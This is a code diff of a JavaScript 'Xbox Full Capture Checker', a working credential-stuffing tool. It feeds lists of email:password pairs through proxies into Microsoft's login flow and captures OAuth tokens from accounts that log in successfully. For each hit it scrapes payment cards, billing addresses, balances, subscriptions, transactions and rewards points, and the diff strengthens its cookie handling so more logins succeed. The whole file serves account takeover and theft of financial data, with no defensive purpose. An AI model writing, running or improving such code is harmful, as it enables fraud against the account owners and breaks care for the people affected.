@@ -1,63 +1,71 @@
 // ============================================================
-//  Xbox Full Capture Checker — 1:1 port of backup-2.py
-//  .xboxchk / /xboxchk command
+//  Xbox Full Capture Checker — 1:1 port of xbox-checker-bot-py/checker.py
+//  Uses dynamic PPFT + urlPost extraction and a per-account cookie jar
+//  so cookies accumulate across the full redirect chain (matches Python
+//  requests.Session behavior). This is critical — without it almost
+//  every account ends up classified as "fail".
 // ============================================================
 
 const { proxiedFetch } = require("./proxy-manager");
+const { runPool } = require("./worker-pool");
 
-const LOGIN_URL = "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username=ashleypetty%40outlook.com&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216";
+const AUTHORIZE_URL =
+  "https://login.live.com/oauth20_authorize.srf" +
+  "?client_id=0000000048170EF2" +
+  "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" +
+  "&response_type=token" +
+  "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL" +
+  "&display=touch";
 
-const LOGIN_HEADERS = {
-  Host: "login.live.com",
-  Connection: "keep-alive",
-  "Cache-Control": "max-age=0",
-  "sec-ch-ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
-  "sec-ch-ua-mobile": "?0",
-  "sec-ch-ua-platform": '"Windows"',
-  "sec-ch-ua-platform-version": '"12.0.0"',
-  "Upgrade-Insecure-Requests": "1",
-  Origin: "https://login.live.com",
-  "Content-Type": "application/x-www-form-urlencoded",
-  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
-  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-  "X-Edge-Shopping-Flag": "1",
-  "Sec-Fetch-Site": "same-origin",
-  "Sec-Fetch-Mode": "navigate",
-  "Sec-Fetch-User": "?1",
-  "Sec-Fetch-Dest": "document",
-  Referer: "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username=ashleypetty%40outlook.com",
+const OAUTH_TOKEN_URL =
+  "https://login.live.com/oauth20_authorize.srf" +
+  "?client_id=000000000004773A" +
+  "&response_type=token" +
+  "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete" +
+  "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth" +
+  "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D" +
+  "&prompt=none";
+
+const COMMON_HEADERS = {
+  "User-Agent":
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+  Accept:
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
   "Accept-Language": "en-US,en;q=0.9",
-  Cookie: 'CAW=<EncryptedData xmlns="http://www.w3.org/2001/04/xmlenc#" Id="BinaryDAToken1" Type="http://www.w3.org/2001/04/xmlenc#Element"><EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"></EncryptionMethod><ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:KeyName>http://Passport.NET/STS</ds:KeyName></ds:KeyInfo><CipherData><CipherValue>M.C534_BAY.0.U.CqFsIZLJMLjYZcShFFeq37gPy/ReDTOxI578jdvIQe34OFFxXwod0nSinliq0/kVdaZSdVum5FllwJWBbzH7LQqQlNIH4ZRpA4BmNDKVZK9APSoJ+YNEFX7J4eX4arCa69y0j3ebxxB0ET0+8JKNwx38dp9htv/fQetuxQab47sTb8lzySoYn0RZj/5NRQHRFS3PSZb8tSfIAQ5hzk36NsjBZbC7PEKCOcUkePrY9skUGiWstNDjqssVmfVxwGIk6kxfyAOiV3on+9vOMIfZZIako5uD3VceGABh7ZxD+cwC0ksKgsXzQs9cJFZ+G1LGod0mzDWJHurWBa4c0DN3LBjijQnAvQmNezBMatjQFEkB4c8AVsAUgBNQKWpXP9p3pSbhgAVm27xBf7rIe2pYlncDgB7YCxkAndJntROeurd011eKT6/wRiVLdym6TUSlUOnMBAT5BvhK/AY4dZ026czQS2p4NXXX6y2NiOWVdtDyV51U6Yabq3FuJRP9PwL0QA==</CipherValue></CipherData></EncryptedData>;MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89',
   "Accept-Encoding": "gzip, deflate",
 };
 
-const TOKEN_URL = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none";
-
-const TOKEN_HEADERS = {
-  Host: "login.live.com",
-  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
-  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-  "Accept-Language": "en-US,en;q=0.5",
-  "Accept-Encoding": "gzip, deflate",
-  Connection: "close",
-  Referer: "https://account.microsoft.com/",
-};
-
-function parseLR(text, left, right) {
-  const re = new RegExp(left.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + "(.*?)" + right.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "s");
-  const m = text.match(re);
-  return m ? m[1] : "";
+// ── Cookie jar (session-like) ────────────────────────────────
+class CookieJar {
+  constructor() { this.jar = {}; }
+  ingest(headers) {
+    const setCookies = headers.getSetCookie?.() || [];
+    for (const c of setCookies) {
+      const [pair] = c.split(";");
+      const eq = pair.indexOf("=");
+      if (eq > 0) {
+        const name = pair.slice(0, eq).trim();
+        const val = pair.slice(eq + 1).trim();
+        if (name) this.jar[name] = val;
+      }
+    }
+  }
+  header() {
+    return Object.entries(this.jar).map(([k, v]) => `${k}=${v}`).join("; ");
+  }
+  dict() { return { ...this.jar }; }
 }
 
-function extractCookies(headers) {
-  const cookies = {};
-  const raw = headers.getSetCookie?.() || [];
-  for (const c of raw) {
-    const [pair] = c.split(";");
-    const eq = pair.indexOf("=");
-    if (eq > 0) cookies[pair.slice(0, eq).trim()] = pair.slice(eq + 1).trim();
-  }
-  return cookies;
+// ── Helpers ──────────────────────────────────────────────────
+function parseLR(text, left, right) {
+  const re = new RegExp(
+    left.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") +
+      "(.*?)" +
+      right.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"),
+    "s"
+  );
+  const m = text.match(re);
+  return m ? m[1] : "";
 }
 
 function checkStatus(text, url, cookies) {
@@ -82,50 +90,124 @@ function checkStatus(text, url, cookies) {
   return "UNKNOWN_FAILURE";
 }
 
+// fetch + cookie jar helper (manual redirects so we accumulate cookies)
+async function jarFetch(url, opts, jar, signal) {
+  const headers = { ...(opts.headers || {}) };
+  const cookieHeader = jar.header();
+  if (cookieHeader) headers.Cookie = cookieHeader;
+
+  // Use redirect: "manual" so we can capture Set-Cookie at each hop
+  let currentUrl = url;
+  let method = opts.method || "GET";
+  let body = opts.body;
+  let res;
+  for (let hop = 0; hop < 10; hop++) {
+    res = await proxiedFetch(currentUrl, {
+      ...opts,
+      method,
+      body,
+      headers: { ...headers, Cookie: jar.header() || undefined },
+      redirect: "manual",
+      signal,
+    });
+    jar.ingest(res.headers);
+    const status = res.status;
+    if (status >= 300 && status < 400) {
+      const loc = res.headers.get("location");
+      if (!loc) break;
+      currentUrl = new URL(loc, currentUrl).toString();
+      // 303 + most browsers convert POST→GET on 302/301 for cross-origin too
+      if (status === 303 || ((status === 301 || status === 302) && method === "POST")) {
+        method = "GET";
+        body = undefined;
+      }
+      continue;
+    }
+    break;
+  }
+  // Attach final URL
+  res._finalUrl = currentUrl;
+  return res;
+}
+
 async function checkSingleAccount(credential, signal) {
   const sep = credential.indexOf(":");
-  if (sep < 0) return { status: "fail", user: credential, password: "", detail: "Invalid format" };
+  if (sep < 0) return { status: "fail", user: credential, password: "", detail: "Bad format" };
 
   const user = credential.slice(0, sep);
   const password = credential.slice(sep + 1);
+  const jar = new CookieJar();
 
   try {
-    const loginBody =
-      `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&` +
-      `PPFT=-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24&` +
-      `PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&` +
-      `login=${encodeURIComponent(user)}&loginfmt=${encodeURIComponent(user)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}`;
+    // ── Step 1: GET authorize page → extract fresh PPFT + urlPost ──
+    const r0 = await jarFetch(AUTHORIZE_URL, { headers: COMMON_HEADERS }, jar, signal);
+    const page = await r0.text();
 
-    // Block 1: Login POST
-    const r1 = await proxiedFetch(LOGIN_URL, {
-      method: "POST",
-      headers: LOGIN_HEADERS,
-      body: loginBody,
-      redirect: "follow",
-      signal,
-    });
+    let ppft = parseLR(page, 'name="PPFT" id="i0327" value="', '"');
+    if (!ppft) ppft = parseLR(page, "sFT:'", "'");
+    if (!ppft) return { status: "fail", user, password, detail: "PPFT not found" };
+
+    let urlPost = parseLR(page, "urlPost:'", "'");
+    if (!urlPost) urlPost = parseLR(page, 'urlPost:"', '"');
+    if (!urlPost) return { status: "fail", user, password, detail: "urlPost not found" };
+
+    // ── Step 2: POST login with fresh PPFT to dynamic urlPost ──
+    const data =
+      `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=` +
+      `&PPFT=${encodeURIComponent(ppft)}` +
+      `&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1` +
+      `&isSignupPost=0&isRecoveryAttemptPost=0&i13=1` +
+      `&login=${encodeURIComponent(user)}&loginfmt=${encodeURIComponent(user)}&type=11&LoginOptions=1` +
+      `&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}`;
+
+    const postHeaders = {
+      ...COMMON_HEADERS,
+      Host: "login.live.com",
+      Connection: "keep-alive",
+      "Cache-Control": "max-age=0",
+      Origin: "https://login.live.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "navigate",
+      "Sec-Fetch-User": "?1",
+      "Sec-Fetch-Dest": "document",
+      Referer: r0._finalUrl || AUTHORIZE_URL,
+      "Upgrade-Insecure-Requests": "1",
+    };
+
+    const r1 = await jarFetch(urlPost, { method: "POST", headers: postHeaders, body: data }, jar, signal);
     const text1 = await r1.text();
-    const allCookies = extractCookies(r1.headers);
-    const finalUrl = r1.url || "";
+    const finalUrl = r1._finalUrl || "";
 
-    const status = checkStatus(text1, finalUrl, allCookies);
+    const status = checkStatus(text1, finalUrl, jar.dict());
     if (status !== "SUCCESS") {
-      if (status === "FAILURE" || status === "UNKNOWN_FAILURE")
-        return { status: "fail", user, password, detail: "Invalid Credentials" };
+      if (status === "FAILURE") return { status: "fail", user, password, detail: "Invalid Credentials" };
+      if (status === "UNKNOWN_FAILURE") return { status: "fail", user, password, detail: "Unknown Failure" };
       if (status === "BAN") return { status: "locked", user, password, detail: "Banned" };
       if (status === "2FACTOR") return { status: "locked", user, password, detail: "2FA/Verify" };
-      if (status === "CUSTOM_LOCK") return { status: "locked", user, password, detail: "Abuse/Cancel" };
+      if (status === "CUSTOM_LOCK") return { status: "locked", user, password, detail: "Custom Lock" };
       return { status: "fail", user, password, detail: status };
     }
 
-    // Block 3: Token fetch
-    const r2 = await proxiedFetch(TOKEN_URL, {
-      method: "GET",
-      headers: { ...TOKEN_HEADERS, Cookie: r1.headers.get("set-cookie") || "" },
-      redirect: "follow",
-      signal,
-    });
-    const url2 = r2.url || (await r2.text());
+    // ── Step 3: OAuth token fetch ──
+    const r2 = await jarFetch(
+      OAUTH_TOKEN_URL,
+      {
+        headers: {
+          Host: "login.live.com",
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
+          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Accept-Encoding": "gzip, deflate",
+          Connection: "close",
+          Referer: "https://account.microsoft.com/",
+        },
+      },
+      jar,
+      signal
+    );
+    const url2 = r2._finalUrl || "";
+    await r2.text().catch(() => "");
     const token = decodeURIComponent(parseLR(url2, "access_token=", "&token_type") || "");
     if (!token) return { status: "locked", user, password, detail: "Token Parse Fail" };
 
@@ -148,7 +230,7 @@ async function checkSingleAccount(credential, signal) {
       "Sec-GPC": "1",
     };
 
-    // Block 5: Payment info
+    // ── Step 4: payment info ──
     const r3 = await proxiedFetch(
       "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
       { headers: apiHeaders, signal }
@@ -163,7 +245,7 @@ async function checkSingleAccount(credential, signal) {
     const address1 = parseLR(src3, '{"address_line1":"', '",') || "N/A";
     const city = parseLR(src3, '"city":"', '",') || "N/A";
 
-    // Block 9: Subscription check
+    // ── Step 5: subscriptions / transactions ──
     const r5 = await proxiedFetch(
       "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
       { headers: apiHeaders, signal }
@@ -185,20 +267,19 @@ async function checkSingleAccount(credential, signal) {
     const totalAmount = parseLR(src5, '"totalAmount":', ",") || "N/A";
     const item1 = parseLR(src5, '"title":"', '"') || "N/A";
 
-    // Block 10: Rewards points
+    // ── Step 6: rewards points ──
     const r4 = await proxiedFetch("https://rewards.bing.com/", {
       headers: {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/80.0.3987.149 Safari/537.36",
         Pragma: "no-cache",
         Accept: "*/*",
-        Cookie: r1.headers.get("set-cookie") || "",
+        Cookie: jar.header(),
       },
       signal,
     });
     const src4 = await r4.text();
     const points = parseLR(src4, ',"availablePoints":', ',"') || "0";
 
-    // Build captures
     const captures = {
       Address: `${address1}, ${city}, ${region}, ${zipcode}`,
       CC: `Country: ${country} | Holder: ${accountHolderName} | Card: ${cardHolder} | Balance: $${balance}`,
@@ -207,7 +288,6 @@ async function checkSingleAccount(credential, signal) {
       Points: points,
     };
 
-    // Active vs expired
     let isActive = false;
     if (subscription && subscription !== "N/A" && nextRenewal && nextRenewal !== "N/A") {
       try {
@@ -231,8 +311,6 @@ async function checkSingleAccount(credential, signal) {
     return { status: "fail", user, password, detail: msg.slice(0, 60) };
   }
 }
-
-const { runPool } = require("./worker-pool");
 
 async function checkXboxAccounts(accounts, threads = 30, onProgress, signal) {
   const results = await runPool({
